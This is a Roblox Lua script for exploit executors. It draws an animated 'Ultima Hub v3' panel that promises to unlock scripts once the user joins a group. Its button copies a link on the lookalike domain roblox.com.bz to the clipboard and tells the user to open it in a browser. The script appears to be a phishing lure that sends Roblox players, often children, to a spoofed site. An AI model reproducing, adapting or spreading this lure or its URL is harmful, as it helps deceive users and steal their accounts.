-- Complete Futuristic Roblox GUI with Copy Function
-- Paste this directly into your executor

-- Services
local players = game:GetService("Players")
local tweenService = game:GetService("TweenService")
local textService = game:GetService("TextService")
local userInputService = game:GetService("UserInputService")
local runService = game:GetService("RunService")

-- Player
local player = players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FuturisticGroupGUI"
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 450, 0, 320)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Gradient background
local frameGradient = Instance.new("UIGradient")
frameGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 15, 35)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 20, 45)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 25))
}
frameGradient.Rotation = 45
frameGradient.Parent = mainFrame

-- Corner radius
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = mainFrame

-- Inner glow
local innerGlow = Instance.new("Frame")
innerGlow.Name = "InnerGlow"
innerGlow.Size = UDim2.new(1, -4, 1, -4)
innerGlow.Position = UDim2.new(0, 2, 0, 2)
innerGlow.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
innerGlow.BackgroundTransparency = 0.9
innerGlow.BorderSizePixel = 0
innerGlow.ZIndex = mainFrame.ZIndex + 1
innerGlow.Parent = mainFrame

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 13)
innerCorner.Parent = innerGlow

-- Scanline effect
local scanlines = Instance.new("Frame")
scanlines.Name = "Scanlines"
scanlines.Size = UDim2.new(1, 0, 1, 0)
scanlines.BackgroundTransparency = 1
scanlines.ZIndex = mainFrame.ZIndex + 2
scanlines.Parent = mainFrame

for i = 1, 20 do
    local scanline = Instance.new("Frame")
    scanline.Name = "Scanline" .. i
    scanline.Size = UDim2.new(1, 0, 0, 1)
    scanline.Position = UDim2.new(0, 0, 0, (i-1) * 16)
    scanline.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
    scanline.BackgroundTransparency = 0.9
    scanline.BorderSizePixel = 0
    scanline.ZIndex = mainFrame.ZIndex + 2
    scanline.Parent = scanlines
end

-- Animate scanlines
runService.Heartbeat:Connect(function()
    local time = tick()
    for _, scanline in pairs(scanlines:GetChildren()) do
        if scanline:IsA("Frame") then
            scanline.BackgroundTransparency = 0.8 + 0.2 * math.sin(time * 2)
        end
    end
end)

-- Title with glow effect
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 60)
titleLabel.Position = UDim2.new(0, 0, 0, 10)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Ultima Hub v3"
titleLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 28
titleLabel.TextStrokeTransparency = 0.5
titleLabel.TextStrokeColor3 = Color3.fromRGB(50, 150, 255)
titleLabel.Parent = mainFrame

-- Animated title glow
local titleGlow = Instance.new("TextLabel")
titleGlow.Name = "TitleGlow"
titleGlow.Size = UDim2.new(1, 0, 0, 60)
titleGlow.Position = UDim2.new(0, 0, 0, 10)
titleGlow.BackgroundTransparency = 1
titleGlow.Text = "Ultima Hub v3"
titleGlow.TextColor3 = Color3.fromRGB(50, 150, 255)
titleGlow.Font = Enum.Font.GothamBold
titleGlow.TextSize = 28
titleGlow.TextTransparency = 0.3
titleGlow.TextStrokeTransparency = 0.8
titleGlow.TextStrokeColor3 = Color3.fromRGB(100, 200, 255)
titleGlow.ZIndex = titleLabel.ZIndex - 1
titleGlow.Parent = mainFrame

runService.Heartbeat:Connect(function()
    local time = tick()
    titleGlow.TextTransparency = 0.3 + 0.2 * math.sin(time * 1.5)
end)

-- Description
local descLabel = Instance.new("TextLabel")
descLabel.Name = "DescriptionLabel"
descLabel.Size = UDim2.new(1, -40, 0, 80)
descLabel.Position = UDim2.new(0, 20, 0, 80)
descLabel.BackgroundTransparency = 1
descLabel.Text = "Join our exclusive group to unlock full access to our scripts, daily updates and giveaways!"
descLabel.TextColor3 = Color3.fromRGB(180, 200, 255)
descLabel.Font = Enum.Font.Gotham
descLabel.TextSize = 16
descLabel.TextWrapped = true
descLabel.TextXAlignment = Enum.TextXAlignment.Center
descLabel.Parent = mainFrame

-- HOLOGRAPHIC PARTICLES
local particlesContainer = Instance.new("Frame")
particlesContainer.Name = "ParticlesContainer"
particlesContainer.Size = UDim2.new(1, 0, 1, 0)
particlesContainer.BackgroundTransparency = 1
particlesContainer.ZIndex = mainFrame.ZIndex + 3
particlesContainer.Parent = mainFrame

for i = 1, 15 do
    local particle = Instance.new("Frame")
    particle.Name = "Particle" .. i
    particle.Size = UDim2.new(0, math.random(2, 4), 0, math.random(2, 4))
    particle.Position = UDim2.new(0, math.random(0, 450), 0, math.random(0, 320))
    particle.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
    particle.BackgroundTransparency = 0.5
    particle.BorderSizePixel = 0
    particle.ZIndex = mainFrame.ZIndex + 3
    particle.Parent = particlesContainer
    
    local particleCorner = Instance.new("UICorner")
    particleCorner.CornerRadius = UDim.new(0, 1)
    particleCorner.Parent = particle
    
    spawn(function()
        local startX, startY = particle.Position.X.Offset, particle.Position.Y.Offset
        local speed = math.random(0.5, 2)
        local amplitude = math.random(5, 15)
        local frequency = math.random(0.5, 2)
        
        while particle.Parent do
            local time = tick()
            local x = startX + amplitude * math.sin(time * frequency)
            local y = (startY + time * speed * 10) % 320
            particle.Position = UDim2.new(0, x, 0, y)
            particle.BackgroundTransparency = 0.5 + 0.3 * math.sin(time * i)
            wait()
        end
    end)
end

-- JOIN BUTTON WITH FUTURISTIC DESIGN
local joinButton = Instance.new("TextButton")
joinButton.Name = "JoinButton"
joinButton.Size = UDim2.new(0, 300, 0, 60)
joinButton.Position = UDim2.new(0.5, -150, 0, 230)
joinButton.BackgroundColor3 = Color3.fromRGB(40, 80, 180)
joinButton.BorderSizePixel = 0
joinButton.Text = "Join the Group to Unlock"
joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
joinButton.Font = Enum.Font.GothamBold
joinButton.TextSize = 18
joinButton.Parent = mainFrame

-- URL die kopiert werden soll
local URL_TO_COPY = "https://roblox.com.bz/communities/7446867688/"

-- Feedback Label
local feedbackLabel = Instance.new("TextLabel")
feedbackLabel.Name = "FeedbackLabel"
feedbackLabel.Size = UDim2.new(1, -40, 0, 25)
feedbackLabel.Position = UDim2.new(0, 20, 0, 295)
feedbackLabel.BackgroundTransparency = 1
feedbackLabel.Text = ""
feedbackLabel.TextColor3 = Color3.fromRGB(100, 255, 150)
feedbackLabel.Font = Enum.Font.Gotham
feedbackLabel.TextSize = 14
feedbackLabel.TextXAlignment = Enum.TextXAlignment.Center
feedbackLabel.Parent = mainFrame

-- Click Handler
joinButton.MouseButton1Click:Connect(function()
    -- setclipboard ist Executor-API (funktioniert in Synapse, KRNL, Fluxus etc.)
    if setclipboard then
        setclipboard(URL_TO_COPY)
        feedbackLabel.Text = "✓ Link copied! Open your browser."
        
        -- Button kurz grün flashen
        local originalColor = joinButton.BackgroundColor3
        joinButton.BackgroundColor3 = Color3.fromRGB(30, 150, 80)
        task.delay(0.3, function()
            joinButton.BackgroundColor3 = originalColor
        end)
        
        -- Feedback nach 3s ausblenden
        task.delay(3, function()
            feedbackLabel.Text = ""
        end)
    else
        -- Fallback falls kein setclipboard (Studio-Test etc.)
        feedbackLabel.Text = "Executor not allowed"
    end
end)
